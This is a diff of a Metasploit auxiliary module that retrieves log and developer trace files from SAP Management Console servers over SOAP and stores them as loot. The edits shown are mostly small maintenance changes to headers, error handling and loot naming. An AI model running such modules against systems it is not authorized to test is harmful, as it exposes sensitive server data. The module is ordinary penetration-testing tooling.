@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -20,7 +16,7 @@ class Metasploit4 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'         => 'SAP Management Console Get Logfile',
-			'Version'      => '$Revision$',
+			'Version'      => '$Revision: 15680 $',
 			'Description'  => %q{
 				This module simply attempts to download available logfiles and
 				developer tracefiles through the SAP Management Console SOAP
@@ -33,8 +29,8 @@ class Metasploit4 < Msf::Auxiliary
 					[ 'URL', 'http://blog.c22.cc' ]
 				],
 			'Author'       => 
-				[	'Chris John Riley', #original msf module
-					'Bruno Morisson <morisson@genhex.org>' # bulk file retrieval
+				[	'Chris John Riley', # original msf module
+					'Bruno Morisson <bm[at]integrity.pt>' # bulk file retrieval
 				],
 			'License'      => MSF_LICENSE
 		)
@@ -59,11 +55,11 @@ class Metasploit4 < Msf::Auxiliary
 	def run_host(ip)
 		res = send_request_cgi({
 			'uri'      => "/#{datastore['URI']}",
-			'method'   => 'GET',
-			'headers'  =>
-				{
-					'User-Agent' => datastore['UserAgent']
-				}
+			'method'   => 'GET' #,
+#			'headers'  =>
+#				{
+#					'User-Agent' => datastore['UserAgent']
+#				}
 		}, 25)
 
 		if not res
@@ -91,6 +87,9 @@ class Metasploit4 < Msf::Auxiliary
 			ns1 = 'ns1:ListLogFiles'
 		when /^TRACE/i
 			ns1 = 'ns1:ListDeveloperTraces'
+		else
+			print_error("#{rhost}:#{rport} [SAP] unsupported filetype #{datastore['FILETYPE']}")
+			return
 		end
 
 		data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
@@ -121,8 +120,8 @@ class Metasploit4 < Msf::Auxiliary
 			env = []
 			if res and res.code == 200
 				case res.body
-				when nil
-					# Nothing
+#				when nil
+#					# Nothing
 				when /<file>(.*)<\/file>/i
 					body = []
 					body = res.body
@@ -179,6 +178,9 @@ class Metasploit4 < Msf::Auxiliary
 			ns1 = 'ns1:ReadLogFile'
 		when /^TRACE/i
 			ns1 = 'ns1:ReadDeveloperTrace'
+		else
+			print_error("#{rhost}:#{rport} [SAP] unsupported filetype: #{datastore['FILETYPE']}")
+			return
 		end
 
 		data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
@@ -210,8 +212,8 @@ class Metasploit4 < Msf::Auxiliary
 
 			if res and res.code == 200
 				case res.body
-				when nil
-					# Nothing
+#				when nil
+#					# Nothing
 				when /<item>([^<]+)<\/item>/i
 					body = []
 					body = res.body
@@ -220,7 +222,7 @@ class Metasploit4 < Msf::Auxiliary
 				end
 
 				case res.body
-				when nil
+#				when nil
 					# Nothing
 				when /<name>([^<]+)<\/name>/i
 					name = $1.strip
@@ -244,13 +246,15 @@ class Metasploit4 < Msf::Auxiliary
 			print_good("#{rhost}:#{rport} [SAP] #{datastore['FILETYPE'].downcase}:#{logfile.downcase} looted")
 			addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB
 			store_loot(
-				"sap.#{datastore['FILETYPE'].downcase}.file",
+			#	"sap.#{datastore['FILETYPE'].downcase}.file",
+				"sap.#{logfile.downcase}.file",
 				"text/xml",
 				addr,
 				res.body,
 				"sap_#{logfile.downcase}.xml",
 				"SAP Get Logfile"
 			)
+			print_status("Logfile stored in: #{p}")
 		elsif fault
 			print_error("#{rhost}:#{rport} [SAP] Error code: #{faultcode}")
 			return
